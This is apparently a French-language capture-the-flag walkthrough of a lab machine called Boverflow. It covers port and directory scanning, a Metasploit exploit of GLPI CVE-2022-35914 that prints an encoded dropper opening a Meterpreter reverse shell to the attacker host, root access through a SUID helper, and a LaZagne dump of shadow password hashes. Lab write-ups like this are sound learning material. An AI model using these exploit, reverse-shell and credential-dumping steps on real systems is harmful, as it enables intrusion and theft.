\# Boverflow

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 80/tcp open
[+] 22/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.254-tcp.html     |
==========================================================

```

&nbsp;

<span style="color: #dddddd;">👊</span> **Gobuster**

Voyons ce qui se trouve sur ce serveur web

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $gobuster dir -u http://192.168.56.254 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt,zip,bak,php.bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.254
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,zip,bak,php.bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 316] [--> http://192.168.56.254/admin/]
/index.php            (Status: 302) [Size: 0] [--> /glpi]
/server-status        (Status: 403) [Size: 279]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

**<span style="color: #dddddd;">🌍</span> GLPI**

Un serveur GLPI qui tourne avec une version datant de 2020 ( en bas a droite )

![Capture du 2025-09-24 12-50-15.png](../../_resources/Capture%20du%202025-09-24%2012-50-15.png)

&nbsp;

<span style="color: #dddddd;">💥</span> **Metasploit - glpi_htmlawed_php_injection**

Exploitation de la `CVE-2022-35914` de  GLPI qui me permet d’avoir un `shell`

```
[msf](Jobs:0 Agents:0) exploit(linux/http/glpi_htmlawed_php_injection) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] token = 49a330999c72b633663cb8910f80c9cb
[*] sid = dao5pl8tnkdf4a98ben55jskg0
[+] The target appears to be vulnerable.
[*] Executing Linux (Dropper) for linux/x64/meterpreter/reverse_tcp
[*] Generated command stager: ["printf '\\177\\105\\114\\106\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\2\\0\\76\\0\\1\\0\\0\\0\\170\\0\\100\\0\\0\\0\\0\\0\\100\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\100\\0\\70\\0\\1\\0\\0\\0\\0\\0\\0\\0\\1\\0\\0\\0\\7\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\100\\0\\0\\0\\0\\0\\0\\0\\100\\0\\0\\0\\0\\0\\372\\0\\0\\0\\0\\0\\0\\0\\174\\1\\0\\0\\0\\0\\0\\0\\0\\20\\0\\0\\0\\0\\0\\0\\61\\377\\152\\11\\130\\231\\266\\20\\110\\211\\326\\115\\61\\311\\152\\42\\101\\132\\152\\7\\132\\17\\5\\110\\205\\300\\170\\121\\152\\12\\101\\131\\120\\152\\51\\130\\231\\152\\2\\137\\152\\1\\136\\17\\5\\110\\205\\300\\170\\73\\110\\227\\110\\271\\2\\0\\21\\134\\300\\250\\70\\225\\121\\110\\211\\346\\152\\20\\132\\152\\52\\130\\17\\5\\131\\110\\205\\300\\171\\45\\111\\377\\311\\164\\30\\127\\152\\43\\130\\152\\0\\152\\5\\110\\211\\347\\110\\61\\366\\17\\5\\131\\131\\137\\110\\205\\300\\171\\307\\152\\74\\130\\152\\1\\137\\17\\5\\136\\152\\176\\132\\17\\5\\110\\205\\300\\170\\355\\377\\346'>>/tmp/lODUy ; chmod +x /tmp/lODUy ; /tmp/lODUy ; rm -f /tmp/lODUy"]
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3090404 bytes) to 192.168.56.254
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.254:35610) at 2025-09-24 12:40:42 +0200
[*] Command Stager progress - 100.00% done (811/811 bytes)

(Meterpreter 1)(/var/www/html/glpi/vendor/htmlawed/htmlawed) > 
```

&nbsp;

🛰️ **fullEx**

Voyons ce que `linpeas` a trouver inintéressant

```
www-data@boverflow:/tmp/fullEx$ bash fullEx.sh -perm
www-data@boverflow:/tmp/fullEx$ ./fullEx.sh -LinPeas
 
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

-rwsr-sr-x 1 root root 16K Sep 27  2020 /home/fox/mysudo (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-sr-x 1 root root 16K Sep 27  2020 /usr/bin/mysudo (Unknown SUID binary!)

```

&nbsp;

**<span style="color: #dddddd;">#️⃣</span> SUID - mysudo**

Élévation de privilège via le binaire `mysudo`

```
www-data@boverflow:/tmp/tools$ /home/fox/mysudo
/home/fox/mysudo

Welcome to mysudo tool, you can run a command on the system as root.

don't try brute force, it's impossible!

Command: /bin/bash
/bin/bash
Username: username
username
Password: password
password
Command output:
root@boverflow:/tmp/tools#
```

&nbsp;

🛰️ **fullEx**

Demandons a notre amis `lazagne` ce qu’il a trouver

```
root@boverflow:/tmp/fullEx# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: root
Hash: $6$pt10lLnXmajc70zj$7zT9qGj/DKHm.KLZOKS7/xL/wclDhICTOqzoNHtbMGVKSe3Ogfcbad8a5O9uFxUeRfqwSYVDfHFH/Y/yWXEbG1:18532:0:99999:7:::

[+] Hash found !!!
Login: fox
Hash: $6$TKbFtUPC3UkfouEf$Mm4Ju9EhQEb75q340nLlQjRkm13U/5vnyi2M00DtJ/uIaKqjCdIrot1fIOGLw9LcIHTO6WqPz8/Dlw3vio5dM/:18532:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 2.37594389915
```